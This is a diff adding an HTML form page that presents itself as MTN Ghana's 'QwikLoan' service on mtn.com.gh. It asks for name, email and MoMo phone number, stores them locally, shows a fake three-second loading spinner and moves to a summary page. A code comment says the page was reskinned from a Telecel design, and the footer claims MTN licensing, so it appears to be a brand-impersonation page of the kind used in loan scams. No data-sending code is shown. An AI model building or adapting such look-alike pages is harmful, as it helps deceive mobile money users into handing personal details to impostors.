@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+    <title>MTN QwikLoan | Personal Details – mtn.com.gh</title>
+    <!-- Replaced Telecel favicon with generic MTN style -->
+    <meta name="theme-color" content="#FFCC00">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #fef9e6;  /* MTN yellow-white tint */
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            text-align: center;
+            margin-bottom: 12px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            position: relative;
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #2c3e50;
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            line-height: 1;
+        }
+
+        .logo {
+            font-size: clamp(28px, 7vw, 40px);
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-mtn {
+            color: #FFCC00;
+            background: #000;
+            display: inline-block;
+            padding: 0 6px;
+            border-radius: 12px;
+            line-height: 1.2;
+        }
+
+        .logo-qwikloan {
+            color: #1a1a1a;
+        }
+
+        main {
+            flex: 1;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .form-card {
+            background: white;
+            border-radius: 20px;
+            padding: 24px 18px 32px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+            position: relative;
+        }
+
+        /* Error box – red border for visibility (unchanged) */
+        .error-box {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            background: #fff;
+            border: 2px solid #ff4d4d;
+            border-radius: 14px;
+            padding: 12px;
+            display: none;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
+            z-index: 100;
+            text-align: left;
+        }
+
+        .error-title {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .error-text {
+            color: #444;
+            font-size: 13px;
+        }
+
+        .close {
+            position: absolute;
+            right: 12px;
+            top: 8px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
+        }
+
+        .form-title {
+            font-size: clamp(24px, 6vw, 32px);
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            margin: 1rem auto 0.8rem;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66.66%;
+            height: 100%;
+            background: linear-gradient(90deg, #FFCC00, #E6B800);
+            border-radius: 4px;
+        }
+
+        .step-text {
+            text-align: center;
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-bottom: 1.8rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fdfdfe;
+            transition: all 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #FFCC00;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+        }
+
+        .form-input.invalid,
+        #phoneGroup.invalid {
+            border-color: #dc3545 !important;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
+        }
+
+        .name-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .name-group>div {
+            flex: 1;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+            padding: 1rem;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            touch-action: manipulation;
+        }
+
+        .prev-btn {
+            background: #e2e8f0;
+            color: #475569;
+            border: none;
+        }
+
+        .prev-btn:active {
+            transform: scale(0.97);
+        }
+
+        .next-btn {
+            background: linear-gradient(90deg, #FFCC00, #E6B800);
+            color: #000;
+            border: none;
+            box-shadow: 0 6px 18px rgba(255, 204, 0, 0.4);
+        }
+
+        .next-btn:active {
+            transform: scale(0.97);
+        }
+
+        .next-btn.disabled-btn,
+        .next-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        footer {
+            padding: 20px 16px;
+            color: #6c757d;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        #spinner {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(2px);
+            z-index: 999;
+        }
+
+        .loader {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #ffe0a3;
+            border-top: 4px solid #FFCC00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 380px) {
+            body {
+                padding: 8px;
+            }
+
+            .form-card {
+                padding: 20px 14px;
+            }
+
+            .form-input {
+                padding: 0.8rem 0.9rem;
+                font-size: 0.9rem;
+            }
+
+            .name-group {
+                gap: 0.8rem;
+                flex-direction: column;
+                margin-bottom: 0.8rem;
+            }
+
+            .btn-group {
+                gap: 0.8rem;
+            }
+
+            .prev-btn,
+            .next-btn {
+                padding: 0.8rem;
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (min-width: 769px) {
+            body {
+                padding: 32px;
+            }
+
+            .form-card {
+                padding: 2.5rem 3rem;
+            }
+        }
+
+        #phoneGroup {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            padding: 0 1rem;
+            background: #fdfdfe;
+        }
+
+        #phoneGroup span {
+            color: #6c757d;
+            font-weight: 500;
+            margin-right: 0.5rem;
+        }
+
+        #phoneGroup input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 0.9rem 0;
+            font-size: 1rem;
+            background: transparent;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-qwikloan"> QwikLoan</span></div>
+    </header>
+    <main>
+        <div class="form-card">
+            <div class="error-box" id="errorBox">
+                <div class="close" onclick="hideError()">×</div>
+                <div class="error-title">Error</div>
+                <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
+            </div>
+
+            <h1 class="form-title">Personal Details</h1>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="step-text">Step 2 of 3</div>
+
+            <div class="name-group">
+                <div>
+                    <label class="form-label">First Name</label>
+                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Kwame">
+                </div>
+                <div>
+                    <label class="form-label">Last Name</label>
+                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Mensah">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Email Address</label>
+                <input type="email" class="form-input" id="email" placeholder="e.g. kwame.mensah@example.com">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Phone Number (MTN MoMo)</label>
+                <div id="phoneGroup">
+                    <span>+233</span>
+                    <input type="tel" id="phone" placeholder="55 123 4567" maxlength="11" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+                <button class="next-btn" id="nextBtn">NEXT STEP</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        © 2026 MTN Ghana – Licensed Mobile Financial Services | Powered by MTN Mobile Money (MoMo) | QwikLoan T&Cs apply
+    </footer>
+
+    <div id="spinner">
+        <div class="loader"></div>
+    </div>
+
+    <script>
+        const firstNameInput = document.getElementById('firstName');
+        const lastNameInput = document.getElementById('lastName');
+        const emailInput = document.getElementById('email');
+        const phoneInput = document.getElementById('phone');
+        const phoneGroup = document.getElementById('phoneGroup');
+        const nextBtn = document.getElementById('nextBtn');
+        const spinner = document.getElementById('spinner');
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
+
+        // Pre-fill from localStorage if available
+        if (localStorage.getItem('firstName')) firstNameInput.value = localStorage.getItem('firstName');
+        if (localStorage.getItem('lastName')) lastNameInput.value = localStorage.getItem('lastName');
+        if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
+        if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');
+
+        function showError(message) {
+            errorText.innerText = message || 'Please fix the highlighted fields.';
+            errorBox.style.display = 'block';
+        }
+
+        function hideError() {
+            errorBox.style.display = 'none';
+        }
+
+        function resetInvalidHighlights() {
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
+                el.classList.remove('invalid');
+            });
+        }
+
+        function isValidPhoneNumber(phoneDigits) {
+            return /^\d{9,11}$/.test(phoneDigits);
+        }
+
+        function validateForm() {
+            let isValid = true;
+            let errorMsg = '';
+
+            resetInvalidHighlights();
+            hideError();
+
+            const firstName = firstNameInput.value.trim();
+            const lastName = lastNameInput.value.trim();
+            const phoneRaw = phoneInput.value.trim();
+
+            if (!firstName) {
+                firstNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'First name is required.';
+            } else if (firstName.length < 2) {
+                firstNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'First name must be at least 2 characters.';
+            }
+
+            if (!lastName) {
+                lastNameInput.classList.add('invalid');
+                isValid = false;
+                if (!errorMsg) errorMsg = 'Last name is required.';
+            } else if (lastName.length < 2) {
+                lastNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Last name must be at least 2 characters.';
+            }
+
+            if (!phoneRaw) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Phone number is required.';
+            } else if (!/^\d{9,11}$/.test(phoneRaw)) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Phone number must be 9, 10, or 11 digits (only numbers).';
+            } else if (!isValidPhoneNumber(phoneRaw)) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Please enter a valid MTN MoMo number (9-11 digits).';
+            }
+
+            const email = emailInput.value.trim();
+            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
+                emailInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Please enter a valid email address (e.g., name@domain.com).';
+            }
+
+            if (!isValid) {
+                showError(errorMsg || 'Please correct the highlighted fields.');
+                const firstInvalid = document.querySelector('.invalid');
+                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return false;
+            }
+            return true;
+        }
+
+        let isProcessing = false;
+
+        function proceedToSummary() {
+            if (isProcessing) return;
+            if (!validateForm()) return;
+
+            localStorage.setItem('firstName', firstNameInput.value.trim());
+            localStorage.setItem('lastName', lastNameInput.value.trim());
+            localStorage.setItem('email', emailInput.value.trim());
+            localStorage.setItem('phone', phoneInput.value.trim());
+
+            nextBtn.disabled = true;
+            nextBtn.classList.add('disabled-btn');
+            isProcessing = true;
+            spinner.style.display = 'flex';
+
+            setTimeout(() => {
+                window.location.href = 'summary.html';
+            }, 3000);
+        }
+
+        nextBtn.addEventListener('click', proceedToSummary);
+
+        const clearErrorOnInput = (el) => {
+            el.addEventListener('input', () => {
+                hideError();
+                el.classList.remove('invalid');
+                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
+            });
+        };
+        clearErrorOnInput(firstNameInput);
+        clearErrorOnInput(lastNameInput);
+        clearErrorOnInput(emailInput);
+        clearErrorOnInput(phoneInput);
+
+        phoneInput.addEventListener('input', () => {
+            phoneGroup.classList.remove('invalid');
+            hideError();
+        });
+
+        window.hideError = hideError;
+    </script>
+</body>
+
+</html>
